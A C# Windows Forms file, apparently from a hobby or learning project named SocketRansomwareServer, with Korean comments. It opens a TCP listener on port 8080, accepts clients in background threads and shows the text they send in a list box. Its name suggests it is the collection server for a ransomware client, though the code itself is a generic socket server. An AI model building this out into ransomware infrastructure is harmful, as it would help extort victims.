using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Drawing.Imaging;

namespace SocketRansomwareServer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            Thread thr = new Thread(Accept); //쓰레드생성
            thr.IsBackground = true; //데몬쓰레드 선언
            thr.Start(); //시작
            button1.Enabled = false; //버튼끄기
        }

        public void Accept()
        {
            TcpClient client; //클라이언트클래스
            TcpListener listener = new TcpListener(IPAddress.Any, 8080); //서버클래스
            client = default(TcpClient); //무슨 메소드인지는 모르겠네요
            listener.Start(); //서버시작
            while (true)
            {
                client = listener.AcceptTcpClient(); //클라이언트 acccept
                clients cList = new clients(); //클라이언트 데이터반환 쓰레드
                cList.Set(client, listBox1); //설정+시작
            }
        }

        private void ListBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        class clients
        {
            private delegate void SafeCallDelegate(string text);
            TcpClient tcp; //해당쓰레드에서 담당할 클라이언트 객체
            ListBox listBox; //리스트박스를 다른클래스에서 조정하기위해 만든 listBox
            public void Set(TcpClient tcp, ListBox listBox)
            {
                this.tcp = tcp;
                this.listBox = listBox;
                Thread thr = new Thread(Run);
                thr.IsBackground = true;
                thr.Start();
            }
            public void Run()
            {
                byte[] bytes = new byte[1024];
                string str = string.Empty;
                NetworkStream net;//네트워크스트림(소켓상에 데이터가 존재하는곳)
                while (true)
                {
                    for (int i = 0; i < 1024; i++) bytes[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
                    net = tcp.GetStream(); //네트워크스트림 얻어오기
                    net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
                    str = Encoding.Default.GetString(bytes); //인코딩
                    UpdateListBoxSafe(str);

                }
            }
            private void UpdateListBoxSafe(string text)
            {
                if (listBox.InvokeRequired)
                {
                    SafeCallDelegate d = new SafeCallDelegate(UpdateListBoxSafe);
                    listBox.Invoke(d, new object[] { text });

                }
                else
                {
                    listBox.Items.Add(text); //표시
                }
            }
        }


    }
}
